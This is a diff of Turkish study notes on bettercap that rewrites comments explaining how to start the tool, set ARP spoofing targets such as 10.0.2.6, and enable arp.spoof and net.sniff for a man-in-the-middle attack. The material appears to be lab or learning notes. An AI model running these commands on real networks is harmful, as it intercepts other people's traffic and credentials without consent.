@@ -70,7 +70,7 @@ Aktif bir saldırı aracıdır. MITM saldırıları, DNS spoofing, credential ha
 
 - > bettercap -iface eth0 //arayüz çıkar
 
-- > help //açıldıktan sonra yazarsan neler yapabileceğin görürünür
+- > help // Kullanılabilir tüm modülleri listeler.
 - > help ... // ... kısmına kullanmak istediğin method girilir.
 
 * net.probe
@@ -89,8 +89,8 @@ Aktif bir saldırı aracıdır. MITM saldırıları, DNS spoofing, credential ha
 - > set arp.spoof.internal true
 - > set arp.spoof.targets 10.0.2.6 //saldırılacak hedefler girilir "," koyup diğer hedefler de yazılabilir
 
-- > arp.spoof on //üsttekileri ayarlayıp çalıştır
-- > net.sniff on //saldırıyı inceletir
+- > arp.spoof on // Belirlenen hedeflere ARP spoofing saldırısını başlatır.
+- > net.sniff on // MITM sırasında geçen veri paketleri analiz edilebilir hale gelir
 
 // saldırır ve hareketler ekranda incelenir
 
